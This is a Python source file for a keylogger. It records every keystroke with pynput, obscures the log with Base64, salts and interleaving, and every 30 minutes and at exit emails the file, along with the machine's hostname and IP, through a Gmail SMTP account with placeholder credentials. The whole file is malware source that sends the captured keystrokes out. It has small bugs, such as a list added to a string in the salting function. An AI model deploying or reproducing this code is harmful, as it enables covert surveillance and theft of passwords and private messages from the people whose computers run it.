from pynput.keyboard import Key, Listener
from datetime import datetime
from base64 import b64encode
from Mail import MailSender
from itertools import chain
from threading import Event
import logging
import atexit
import socket
import Timer

# Path where the file containing the keystrokes is located
log_dir = ""
# List contaning the keystrokes
keystrokes = []
'''
    Creates a logging that manages our "key_log.txt" file,
    filemode = w: the logging wont append the text to the file,
    instead it'll replace the content in it.
'''
logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(message)s', filemode='w')


# Defines a main function, thas writes the file and sendd the email
def main():
    write_file()
    send_email()


# Creates a event to stop the Timer
stop = Event()
# Creates a Timer that invokes the main() every 30 minutes
timer = Timer.PerpetualTimer(
    func=main,
    time=30,
    time_unit="mins",
    stop_event=stop)
# Starts the timer
timer.start()


def encode(string):
    '''
        Encodes a strings using the Base64 algorithm

        Args:
            string STRING: string to be encoded

        Returns:
            A encoded string. Example: 'man' -> 'Tfuw'
    '''
    string = b64encode(string.encode())
    return string.decode('utf-8')


def add_salts(string):
    """
    Adds random pieces of text into a string,
    so even if someone decode the string
    (Bas64 -> Text : 'Tfwu' -> 'man')
    this won't returns the original text
    Example: 'man' -> 'Tfwu' -> 'Tasdfd12dwu335d'
             Text  -> Base64 -> Added Salts

    Args:
        string STRING: The string where will be added the salts

    Returns:
        string: Returns the string with the salts added
    """
    # The salts, changes to customize it
    salts = ["@@PoC", "ˆaDnIL(", "nSo@rsa2h"]
    size = len(string)
    '''
     Adds every salts at the middle of the string
     Example: salts = ["123", "456"]; string = "abc"
              abc -> a123bc -> a124563bc
    '''
    for s in salts:
        string = string[0:int(size / 2)] + s + string[int(size / 2):size]
    '''
    Adds the first salt, then the string, then the rest at reverse order
    Example: salts = ["123", "456", "789"]; string = "abc"
             abd -> 123abc -> 123abc789456
    '''
    return salts[0] + string + [x for x in salts[1:]][::-1]


def encrypt(string):
    """
    Encodes the string using Base64, adds salts and
    merge the string and its reverse intercalating
    Example (intercalation): "abc" -> "acbbca"

    Args:
        string STRING: string to be encoded

    Returns:
        STRING: returns a encoded string
    """
    # Encodes using Base64
    string = encode(string)
    # Adds the salt to the string
    string = add_salts(string)
    '''
    Creates a list of tuples containing the intercalation
    Example: abc -> [(a, c), (b, b), (c ,a)]
    '''
    string = zip(string, string[::-1])
    # Changes the list of tuples into a list
    string = chain(*string)
    string = list(string)
    # Creates a string from the list and encodes it
    return encode("".join(string))


def write_file():
    """
    Writes a file containing the encrypted keystrokes

    Returns:
         NULL
    """
    # Gets the keystrokes as a global variable to be able to changes it's value
    global keystrokes
    # Write the file
    logging.info(encrypt("".join(keystrokes)))
    # Erases the content of the "keystrokes" variable
    keystrokes = []
    return


def send_email():
    """
    Creates a email and sends it

    Returns:
        NULL
    """
    # Sets the subjects as the name of computer and IP
    sub = socket.gethostname() + " - IP: " \
        + socket.gethostbyname(socket.gethostname())
    # Creates the email
    mail = MailSender("your_email@gmail.com",
                      "your_password",
                      "your_email@gmail",
                      "smtp.gmail.com:587",
                      log_dir + "key_log.txt",
                      sub,
                      str(datetime.now())
                      )
    # Sends the email
    mail.send_email()
    return


def exit_handler():
    """
        Writes the "key_log.txt" files, sends the email,
        stops the timer and the listener before the program closes
    """
    write_file()
    send_email()
    stop.set()
    Listener.stop


'''
Registers the "exit_handler" as the function
to be executed before the program closes
'''
atexit.register(exit_handler)


def on_press(key):
    """
    Function to be executed when a key is pressed

    Args:
        key KEY: key pressed
    """
    global keystrokes
    keystrokes.append(str(key))


'''
Sets a listener, that is listening the keyborad
events, to the "on_press" function
'''
with Listener(on_press=on_press) as listener:
    listener.join()
